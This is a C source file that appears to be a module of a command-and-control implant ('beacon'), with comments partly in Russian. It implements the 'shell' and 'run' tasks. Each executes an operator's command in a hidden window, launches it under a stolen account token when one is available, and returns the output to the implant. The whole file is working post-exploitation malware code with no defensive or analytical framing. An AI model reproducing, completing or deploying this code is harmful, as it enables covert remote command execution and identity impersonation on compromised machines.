// shell / run commands — execute a command via cmd.exe or directly.

#include "../core/beacon.h"

// Объявлено в cmd_token.c; возвращает primary-токен украденного аккаунта
// (NULL если steal_token не выполнялся или после rev2self).
extern HANDLE beacon_primary_token(void);

// Execute a command, collect stdout+stderr, write to output buffer.
static void run_command(const char* cmd, int use_shell) {
    // Build command line.
    char full_cmd[4096];
    size_t off = 0;
    if (use_shell) {
        const char prefix[] = "cmd.exe /c ";
        rt_memcpy(full_cmd, prefix, sizeof(prefix)-1);
        off = sizeof(prefix)-1;
    }
    size_t cmd_len = rt_strlen(cmd);
    if (off + cmd_len + 1 > sizeof(full_cmd)) cmd_len = sizeof(full_cmd) - off - 1;
    rt_memcpy(full_cmd + off, cmd, cmd_len);
    full_cmd[off + cmd_len] = '\0';

    // Anonymous pipe for stdout+stderr.
    HANDLE r_pipe = NULL, w_pipe = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&r_pipe, &w_pipe, &sa, 0)) return;
    SetHandleInformation(r_pipe, HANDLE_FLAG_INHERIT, 0); // read end non-inheritable

    PROCESS_INFORMATION pi;
    rt_memset(&pi, 0, sizeof(pi));
    BOOL ok = FALSE;

    HANDLE hPrimary = beacon_primary_token();
    if (hPrimary) {
        // Есть украденный токен — запускаем дочерний процесс от его имени.
        // CreateProcessWithTokenW требует wide-строки и StartupInfoW.
        WCHAR wcmd[4096];
        MultiByteToWideChar(CP_ACP, 0, full_cmd, -1, wcmd, 4096);

        STARTUPINFOW siw;
        rt_memset(&siw, 0, sizeof(siw));
        siw.cb         = sizeof(siw);
        siw.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        siw.wShowWindow= SW_HIDE;
        siw.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
        siw.hStdOutput = w_pipe;
        siw.hStdError  = w_pipe;

        // LOGON_WITH_PROFILE (1) грузит профиль, 0 — без профиля (быстрее).
        ok = CreateProcessWithTokenW(hPrimary, 0, NULL, wcmd,
                                     CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);
        if (!ok) {
            // Если не удалось — падаем на обычный CreateProcess (не фатально).
            STARTUPINFOA si2;
            rt_memset(&si2, 0, sizeof(si2));
            si2.cb         = sizeof(si2);
            si2.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si2.wShowWindow= SW_HIDE;
            si2.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
            si2.hStdOutput = w_pipe;
            si2.hStdError  = w_pipe;
            ok = CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
                                CREATE_NO_WINDOW, NULL, NULL, &si2, &pi);
        }
    } else {
        STARTUPINFOA si;
        rt_memset(&si, 0, sizeof(si));
        si.cb         = sizeof(si);
        si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow= SW_HIDE;
        si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
        si.hStdOutput = w_pipe;
        si.hStdError  = w_pipe;
        ok = CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    CloseHandle(w_pipe); // закрываем свою копию — ReadFile вернёт EOF когда дочерний завершится.

    if (!ok) {
        CloseHandle(r_pipe);
        const char err[] = "CreateProcess failed\n";
        out_write(err, sizeof(err)-1);
        return;
    }

    // Read output in chunks; convert OEM codepage → UTF-8.
    uint8_t chunk[4096];
    DWORD rd = 0;
    while (ReadFile(r_pipe, chunk, sizeof(chunk), &rd, NULL) && rd > 0) {
        int wn = MultiByteToWideChar(CP_OEMCP, 0, (LPCCH)chunk, (int)rd, NULL, 0);
        if (wn <= 0) { out_write(chunk, rd); continue; }
        WCHAR* wbuf = (WCHAR*)bmalloc((wn + 1) * sizeof(WCHAR));
        if (!wbuf) { out_write(chunk, rd); continue; }
        MultiByteToWideChar(CP_OEMCP, 0, (LPCCH)chunk, (int)rd, wbuf, wn);
        int un = WideCharToMultiByte(CP_UTF8, 0, wbuf, wn, NULL, 0, NULL, NULL);
        if (un > 0) {
            uint8_t* ubuf = (uint8_t*)bmalloc((size_t)un);
            if (ubuf) {
                WideCharToMultiByte(CP_UTF8, 0, wbuf, wn, (LPSTR)ubuf, un, NULL, NULL);
                out_write(ubuf, (size_t)un);
                bfree(ubuf);
            } else {
                out_write(chunk, rd);
            }
        }
        bfree(wbuf);
    }

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(r_pipe);
}

void cmd_shell(const BeaconTask* t) {
    if (!t->pay || t->pay_len == 0) return;
    // Ensure null-terminated string.
    char cmd[4096];
    size_t len = t->pay_len < sizeof(cmd)-1 ? t->pay_len : sizeof(cmd)-1;
    rt_memcpy(cmd, t->pay, len);
    cmd[len] = '\0';
    run_command(cmd, 1);
}

void cmd_run(const BeaconTask* t) {
    if (!t->pay || t->pay_len == 0) return;
    char cmd[4096];
    size_t len = t->pay_len < sizeof(cmd)-1 ? t->pay_len : sizeof(cmd)-1;
    rt_memcpy(cmd, t->pay, len);
    cmd[len] = '\0';
    run_command(cmd, 0);
}
